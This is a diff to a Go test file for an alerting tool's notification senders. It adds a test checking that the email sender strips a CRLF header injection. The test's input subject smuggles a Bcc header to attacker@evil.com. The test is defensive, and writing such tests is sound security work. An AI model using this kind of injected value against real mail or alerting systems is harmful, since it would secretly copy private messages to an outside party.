@@ -49,6 +49,38 @@ func TestEmailSenderBuildsEnvelope(t *testing.T) {
 	}
 }
 
+func TestEmailSenderStripsHeaderInjection(t *testing.T) {
+	var gotPayload []byte
+	send := func(_ context.Context, _ Config, _, _ string, _ []string, payload []byte) error {
+		gotPayload = payload
+		return nil
+	}
+	s := NewSenders(nil, send)[TypeEmail]
+	c := Channel{Type: TypeEmail, Config: Config{
+		SMTPHost: "smtp.x", SMTPPort: 587, From: "a@x", To: []string{"b@x"},
+	}}
+	// A system named with an embedded CRLF would otherwise smuggle a Bcc
+	// header into the alert email.
+	msg := testMsg()
+	msg.Subject = "[FIRING] High memory on web-1\r\nBcc: attacker@evil.com"
+	if err := s.Send(context.Background(), c, "pw", msg); err != nil {
+		t.Fatalf("send: %v", err)
+	}
+	p := string(gotPayload)
+	if strings.Contains(p, "\r\nBcc:") {
+		t.Errorf("CRLF injection created a Bcc header line: %q", p)
+	}
+	// The header block must end exactly once, at the blank separator line —
+	// the injected payload must not have created a second header section.
+	headers, _, ok := strings.Cut(p, "\r\n\r\n")
+	if !ok {
+		t.Fatalf("no header/body separator: %q", p)
+	}
+	if strings.Count(headers, "Subject:") != 1 {
+		t.Errorf("expected exactly one Subject header, got: %q", headers)
+	}
+}
+
 func TestSlackSenderPostsText(t *testing.T) {
 	var body map[string]string
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
